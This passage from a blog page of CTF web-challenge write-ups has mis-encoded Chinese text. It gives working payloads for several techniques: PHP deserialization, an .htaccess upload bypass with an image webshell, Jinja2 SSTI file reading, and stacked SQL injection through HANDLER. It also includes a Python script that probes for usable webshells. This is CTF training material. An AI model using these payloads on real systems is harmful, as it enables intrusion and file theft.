&lt;li&gt;&lt;code&gt;read()&lt;/code&gt;ä½¿ç”¨**file_get_contents()**å‡½æ•°è¯»å–æ–‡ä»¶ã€‚&lt;strong&gt;æ­£æ˜¯æˆ‘ä»¬æƒ³è¦çš„&lt;/strong&gt;ã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;output()&lt;/code&gt;è¾“å‡ºå†…å®¹ã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;__destruct()&lt;/code&gt;å¯¹è±¡é”€æ¯æ—¶ä¼šæ‰§è¡Œçš„å‡½æ•°ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯&lt;strong&gt;if&lt;/strong&gt;åˆ¤æ–­é‡Œçš„&lt;code&gt;$this-&amp;gt;op === &amp;quot;2&amp;quot;&lt;/code&gt;æ˜¯å¼ºæ¯”è¾ƒï¼Œå¹¶ä¸”ä¼šä¿®æ”¹opçš„å€¼ä¸º1ï¼ˆå†™æ–‡ä»¶ï¼‰ï¼Œå› ä¸º**&amp;ldquo;2&amp;rdquo;&lt;strong&gt;æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹çš„å¦‚æœä¼ å…¥&lt;/strong&gt;æ•´å‹çš„2**å³å¯ç»•è¿‡ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;æ‰€ä»¥æˆ‘ä»¬æ„é€ ä¸€ä¸ªå¯¹è±¡&lt;strong&gt;op&lt;/strong&gt;ä¸º2ï¼Œ&lt;strong&gt;filename&lt;/strong&gt;ä¸ºflag.phpå³å¯ï¼Œè¯»æ–‡ä»¶çš„æ—¶å€™è‚¯å®šä¸æ˜¯&lt;/p&gt;
&lt;p&gt;æ¥ä¸‹æ¥æ˜¯ååºåˆ—åŒ–æ—¶ä¼šé‡åˆ°çš„é—®é¢˜ï¼Œå› ä¸ºå¯¹è±¡ä¸­å±æ€§çš„ä¿®é¥°æ˜¯&lt;code&gt;protected&lt;/code&gt;ï¼Œåºåˆ—åŒ–æ—¶éœ€è¦ä¿è¯ä¸€è‡´çš„ã€‚&lt;/p&gt;
&lt;p&gt;å…ˆç»™å‡ºè‡ªå·±åˆ›å»ºçš„å¯¹è±¡æºç &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;FileHandler&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;protected&lt;/span&gt; $op&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;2&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;protected&lt;/span&gt; $filename&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;/var/www/html/flag.php&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;protected&lt;/span&gt; $content;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$c &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;FileHandler&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;serialize&lt;/span&gt;($c);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol&gt;
&lt;li&gt;PHP7.1ä»¥ä¸Šç‰ˆæœ¬å¯¹å±æ€§ç±»å‹ä¸æ•æ„Ÿã€ç”¨publicç»•è¿‡:&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;O:11:&amp;#34;FileHandler&amp;#34;:3:{s:2:&amp;#34;op&amp;#34;;i:2;s:8:&amp;#34;filename&amp;#34;;s:22:&amp;#34;/var/www/html/flag.php&amp;#34;;s:7:&amp;#34;content&amp;#34;;N;}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;è¿è¡Œä»¥åå¯ä»¥åœ¨ç½‘é¡µæ³¨é‡Šä¸­æ‰¾åˆ°æ–‡ä»¶ã€‚ç»å¯¹è·¯å¾„è¯»å–ä¹Ÿå¯ä»¥ï¼Œæˆ‘ç¬¬ä¸€æ¬¡ä½¿ç”¨php://filterè¯»å†å»è§£ç ä¹ŸæˆåŠŸäº†ã€‚&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;O:11:&amp;#34;FileHandler&amp;#34;:3:{s:2:&amp;#34;op&amp;#34;;i:2;s:8:&amp;#34;filename&amp;#34;;s:52:&amp;#34;php://filter/convert.base64-encode/resource=flag.php&amp;#34;;s:7:&amp;#34;content&amp;#34;;N;}
&lt;/code&gt;&lt;/pre&gt;&lt;ol start="2"&gt;
&lt;li&gt;åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­sæ›¿æ¢ä¸ºSï¼Œæ”¯æŒå­—ç¬¦ä¸²ç”¨16è¿›åˆ¶ï¼Œ&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;O:11:&amp;#34;FileHandler&amp;#34;:3:{S:5:&amp;#34;\00*\00op&amp;#34;;i:2;S:11:&amp;#34;\00*\00filename&amp;#34;;S:22:&amp;#34;/var/www/html/flag.php&amp;#34;;S:10:&amp;#34;\00*\00content&amp;#34;;N;}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;æ€è·¯ï¼šhttps://blog.csdn.net/Oavinci/article/details/106998738&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="mrctf2020ä½ ä¼ ä½ å‘¢"&gt;[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210308104930.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;æµ‹è¯•åç¼€ï¼Œphpã€phtmléƒ½è¢«è¿‡æ»¤äº†ï¼Œhtaccesså¯ä»¥ï¼Œå…ˆä¼ ä¸Šç‰¹ä¾›çš„&lt;code&gt;.htaccess&lt;/code&gt;&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;SetHandler application/x-httpd-php
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210308105247.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;ä¼ å›¾ç‰‡é©¬ï¼Œæˆ‘ä¸€ç›´ç”¨çš„æ˜¯GIFé©¬ï¼Œå‡ æ¬¡å°è¯•éƒ½æ²¡é€šè¿‡ï¼Œåæ¥ä¿®æ”¹äº†&lt;code&gt;Content-Type: image/jpeg&lt;/code&gt;å¯ä»¥äº†ï¼Œè¯´æ˜Content-Typeæ˜¯GIFè¿˜ä¸è¡Œï¼Œæ¥ä¸‹æ¥ç›´æ¥ä¼ å›¾ç‰‡ç &lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210308105652.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;æ ¹æ®åœ°å€è®¿é—®å›¾ç‰‡é©¬çš„åœ°å€ï¼Œä½¿ç”¨systemè¯»æ–‡ä»¶è¿˜æ²¡æˆï¼Œç”¨èšå‰‘è¿äº†æ‰§è¡Œæ‰§è¡Œret=127,disable_functionäº†&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210308110126.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;ä¸è¿‡æ ¹ç›®å½•ä¸‹çš„flagæ–‡ä»¶è¿˜æ˜¯å¯ä»¥æ­£å¸¸è¯»å–ï¼Œè‡³äºdisable_functionå¯ä»¥å‚è€ƒ&lt;a class="link" href="https://braindance.tk/2020/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DRCE%20ME/" target="_blank" rel="noopener"
&gt;ã€æå®¢å¤§æŒ‘æˆ˜ 2019ã€‘RCE ME&lt;/a&gt;ã€‚&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="bjdctf-2ndfake-google"&gt;[BJDCTF 2nd]fake google
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210308110510.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;å°±ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œéšä¾¿è¾“å…¥ä¸€ä¸ªå»çœ‹çœ‹ï¼Œè·³è½¬ä»¥å&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210308110545.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;æ³¨é‡Šé‡Œæœ‰æç¤ºsstiï¼Œåº”è¯¥æ˜¯æ¨¡æ¿æ³¨å…¥ï¼Œå°±åœ¨ç½‘ä¸Šæœä¸€ä¸ªsstiçš„payloadè¯•è¯•&lt;a class="link" href="https://blog.csdn.net/qq_40657585/article/details/83657220" target="_blank" rel="noopener"
&gt;SSTI (æœåŠ¡å™¨æ¨¡æ¿æ³¨å…¥)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;æ‰¾åˆ°äº†ä¸€ä¸ªç›´æ¥è¯»æ–‡ä»¶çš„payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;?name={% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==&amp;#39;catch_warnings&amp;#39; %}{{ c.__init__.__globals__[&amp;#39;__builtins__&amp;#39;].open(&amp;#39;/flag&amp;#39;, &amp;#39;r&amp;#39;).read() }}{% endif %}{% endfor %}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210308110717.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="gyctf2020blacklist"&gt;[GYCTF2020]Blacklist
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210308110821.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;sqlæ³¨å…¥ï¼Œå…ˆè¯•ä¸€è¯•å †å æ³¨å…¥ï¼Œå¯ä»¥æ‰§è¡Œï¼Œå°è¯•selectçš„æ—¶å€™è¿”å›äº†è¿‡æ»¤å†…å®¹&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;preg_match&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&amp;#34;&lt;/span&gt;,$inject);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å‰é¢è¿˜æœ‰ä¸€ä¸ªå †å æ³¨å…¥çš„æ˜¯æ–°å§¿åŠ¿**[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨**ï¼Œä¸€ç§æ˜¯ä½¿ç”¨prepareé¢„å¤„ç†è¯­å¥ï¼Œå¦ä¸€ç§æ˜¯ä¿®æ”¹è¡¨åï¼Œæ ¹æ®ä¸Šé¢çš„è¿‡æ»¤å†…å®¹ï¼Œä¸¤ç§æ–¹æ³•éƒ½è¢«è¿‡æ»¤äº†ã€‚å…ˆè¯•è¯•æŸ¥çœ‹è¡¨ï¼š&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;-&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;;show tables;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt;FlagHere
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt;words
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æŸ¥çœ‹è¡¨ç»“æ„ï¼š&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;-&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;;desc `FlagHere`;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ¥ä¸‹æ¥æ˜¯çœ‹çš„wpï¼Œå­¦åˆ°äº†ä¸ªæ–°å§¿åŠ¿ï¼šä½¿ç”¨&lt;code&gt;HANDLER ... OPEN&lt;/code&gt;è¯­å¥ï¼Œè´´ä¸€ä¸ª&lt;a class="link" href="https://dev.mysql.com/doc/refman/8.0/en/handler.html" target="_blank" rel="noopener"
&gt;å®˜æ–¹æ–‡æ¡£&lt;/a&gt;ã€‚&lt;/p&gt;
&lt;p&gt;&lt;code&gt;HANDLER ... OPEN&lt;/code&gt;è¯­å¥æ‰“å¼€ä¸€ä¸ªè¡¨ï¼Œä½¿å…¶å¯ä»¥ä½¿ç”¨åç»­&lt;code&gt;HANDLER ... READ&lt;/code&gt;è¯­å¥è®¿é—®ï¼Œè¯¥è¡¨å¯¹è±¡æœªè¢«å…¶ä»–ä¼šè¯å…±äº«ï¼Œå¹¶ä¸”åœ¨ä¼šè¯è°ƒç”¨&lt;code&gt;HANDLER ... CLOSE&lt;/code&gt;æˆ–ä¼šè¯ç»ˆæ­¢ä¹‹å‰ä¸ä¼šå…³é—­&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;-&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;;handler FlagHere open;handler FlagHere read first;handler FlagHere close
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210308111414.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="å¼ºç½‘æ¯-2019é«˜æ˜çš„é»‘å®¢"&gt;[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210308112326.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;ä¸‹è½½æºç ä»¥åä¸€å †ä¸å¯è¯»çš„æºç ï¼Œä½†æ˜¯é‡Œé¢æœ‰å¾ˆå¤šshellï¼Œçœ‹ä¸æ‡‚æ‰€ä»¥æ‰¾äº†wpï¼Œæ€è·¯å°±æ˜¯ç”¨è„šæœ¬åŒ¹é…æ–‡ä»¶ä¸­çš„shellï¼Œç„¶åä¼ å‚è¯•ä¸€è¯•æ¯ä¸€ä¸ªshellæ˜¯å¦èƒ½ç”¨ï¼ŒæŠ„è„šæœ¬&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# codeing = utf-8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; requests
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; os
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; re
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; threading
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; time
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;requests&lt;span style="color:#f92672"&gt;.&lt;/span&gt;adapters&lt;span style="color:#f92672"&gt;.&lt;/span&gt;DEFAULT_RETRIES &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;session &lt;span style="color:#f92672"&gt;=&lt;/span&gt; requests&lt;span style="color:#f92672"&gt;.&lt;/span&gt;session()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;session&lt;span style="color:#f92672"&gt;.&lt;/span&gt;keep_alive &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;False&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sem&lt;span style="color:#f92672"&gt;=&lt;/span&gt;threading&lt;span style="color:#f92672"&gt;.&lt;/span&gt;Semaphore(&lt;span style="color:#ae81ff"&gt;30&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;url&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;http://84fa677d-e4dd-47a1-9124-1823cc996d12.node3.buuoj.cn/&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;path &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;D:\DROPS\phpstudy_pro\WWW\ctf\src&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\\&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;fileNames &lt;span style="color:#f92672"&gt;=&lt;/span&gt; os&lt;span style="color:#f92672"&gt;.&lt;/span&gt;listdir(path)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;rrGET &lt;span style="color:#f92672"&gt;=&lt;/span&gt; re&lt;span style="color:#f92672"&gt;.&lt;/span&gt;compile(&lt;span style="color:#e6db74"&gt;r&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;\$_GET\[\&amp;#39;(\w+)\&amp;#39;\]&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;rrPOST &lt;span style="color:#f92672"&gt;=&lt;/span&gt; re&lt;span style="color:#f92672"&gt;.&lt;/span&gt;compile(&lt;span style="color:#e6db74"&gt;r&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;\$_POST\[\&amp;#39;(\w+)\&amp;#39;\]&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;local_file &lt;span style="color:#f92672"&gt;=&lt;/span&gt; open(&lt;span style="color:#e6db74"&gt;&amp;#34;flag.txt&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;w&amp;#34;&lt;/span&gt;,encoding&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;utf-8&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;run&lt;/span&gt;(fileName):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;with&lt;/span&gt; sem:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; file &lt;span style="color:#f92672"&gt;=&lt;/span&gt; open(path&lt;span style="color:#f92672"&gt;+&lt;/span&gt;fileName,&lt;span style="color:#e6db74"&gt;&amp;#39;r&amp;#39;&lt;/span&gt;,encoding&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;utf-8&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; content &lt;span style="color:#f92672"&gt;=&lt;/span&gt; file&lt;span style="color:#f92672"&gt;.&lt;/span&gt;read()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print(&lt;span style="color:#e6db74"&gt;&amp;#34;[+]checking: &lt;/span&gt;&lt;span style="color:#e6db74"&gt;%s&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#f92672"&gt;%&lt;/span&gt;fileName)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;#GET&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; i &lt;span style="color:#f92672"&gt;in&lt;/span&gt; rrGET&lt;span style="color:#f92672"&gt;.&lt;/span&gt;findall(content):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; r &lt;span style="color:#f92672"&gt;=&lt;/span&gt; session&lt;span style="color:#f92672"&gt;.&lt;/span&gt;get(url&lt;span style="color:#f92672"&gt;+&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#e6db74"&gt;%s&lt;/span&gt;&lt;span style="color:#e6db74"&gt;?&lt;/span&gt;&lt;span style="color:#e6db74"&gt;%s&lt;/span&gt;&lt;span style="color:#e6db74"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;%s&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#f92672"&gt;%&lt;/span&gt;(fileName,i,&lt;span style="color:#e6db74"&gt;&amp;#34;echo ~guobanghhh~&amp;#34;&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;~guobanghhh~&amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;in&lt;/span&gt; r&lt;span style="color:#f92672"&gt;.&lt;/span&gt;text:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; flag &lt;span style="color:#f92672"&gt;=&lt;/span&gt; fileName &lt;span style="color:#f92672"&gt;+&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;ä¸­çš„&amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;+&lt;/span&gt; i &lt;span style="color:#f92672"&gt;+&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;å¯ä»¥ç”¨ï¼ï¼ï¼&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print(flag)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; local_file&lt;span style="color:#f92672"&gt;.&lt;/span&gt;write(flag)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;#POST&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;# for i in rrPOST.findall(content):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;# r = session.post(url+fileName,data={i:&amp;#34;echo ~guobanghhh~&amp;#34;})&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;# if &amp;#34;~guobanghhh~&amp;#34; in r.text:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;# flag = fileName + &amp;#34;ä¸­çš„&amp;#34; + i + &amp;#34;å¯ä»¥ç”¨ï¼ï¼ï¼&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;# print(flag)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;# local_file.write(flag)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; __name__ &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; run(&lt;span style="color:#e6db74"&gt;&amp;#34;xk0SzyKwfzw.php&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; start_time &lt;span style="color:#f92672"&gt;=&lt;/span&gt; time&lt;span style="color:#f92672"&gt;.&lt;/span&gt;time() &lt;span style="color:#75715e"&gt;# å¼€å§‹æ—¶é—´&lt;/span&gt;
